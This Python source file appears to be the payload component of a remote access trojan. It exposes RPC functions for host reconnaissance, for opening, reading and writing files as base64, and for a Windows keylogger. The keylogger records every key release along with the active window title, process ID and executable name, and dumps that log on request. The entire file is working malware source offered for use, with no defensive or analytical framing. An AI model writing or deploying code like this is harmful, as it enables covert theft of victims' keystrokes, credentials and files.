# -*- coding: utf-8 -*-

from ctypes import byref, create_string_buffer, c_ulong, windll
import collections
import datetime

from pynput import keyboard

from . import rpc


class PayloadRPCHandler(rpc.RPCHandler):

    def rpc_dir(self):
        return list(self._functions)

    def rpc_echo(self, s):
        return s


def uname():
    import platform
    return platform.uname()


def get_file_size(path):
    import os
    return os.path.getsize(path)


def get_username():
    import getpass
    return getpass.getuser()


def get_hostname():
    import socket
    return socket.gethostname()


def get_platform():
    import sys
    return sys.platform


def list_dir(path):
    import os
    return os.listdir(path)


def change_dir(path):
    import os
    path = os.path.expanduser(path)
    os.chdir(path)


def get_current_dir():
    import os
    return os.getcwd()


class FileOpener:

    def __init__(self):
        self.open_files = dict()

    def open_file(self, path, mode='r'):
        f = open(path, mode)
        fid = id(f)
        self.open_files[fid] = f
        return fid

    def close_file(self, fid):
        if fid not in self.open_files:
            return
        f = self.open_files[fid]
        f.close()
        del self.open_files[fid]


class FileReader:

    def read_file(self, fid, size):
        import base64
        f = self.open_files[fid]
        data = f.read(size)
        return base64.urlsafe_b64encode(data)


class FileWriter:

    def write_file(self, fid, data):
        import base64
        f = self.open_files[fid]
        data = base64.urlsafe_b64decode(data)
        f.write(data)
        f.flush()


class KeyloggerService:

    def __init__(self):
        self.listener = None
        self._dq = collections.deque(maxlen=1000)

    def keylogger_start(self):
        if self.listener is not None:
            return
        self.listener = keyboard.Listener(
                on_press=self._on_press,
                on_release=self._on_release,
        )
        self.listener.start()
        entry = {
                'event': 'Keylogger.start',
                'time': datetime.datetime.now(),
        }
        self._dq.append(entry)

    def keylogger_dump(self):
        return self._dq

    def keylogger_stop(self):
        if self.listener is None:
            return
        self.listener.stop()
        self.listener = None
        entry = {
                'event': 'Keylogger.stop',
                'time': datetime.datetime.now(),
        }
        self._dq.append(entry)

    def _on_press(self, key):
        pass

    def _on_release(self, key):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = '{}'.format(pid.value)
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(
                h_process, None, byref(executable), 512,
        )
        executable = executable.value.decode()
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            window_title = window_title.value.decode()
        except UnicodeDecodeError:
            window_title = ''

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

        try:
            key = key.char
        except AttributeError:
            key = str(key)

        entry = {
                'event': 'Key.release',
                'key': str(key),
                'time': datetime.datetime.now(),
                'title': window_title,
                'pid': process_id,
                'exe': executable,
        }
        self._dq.append(entry)

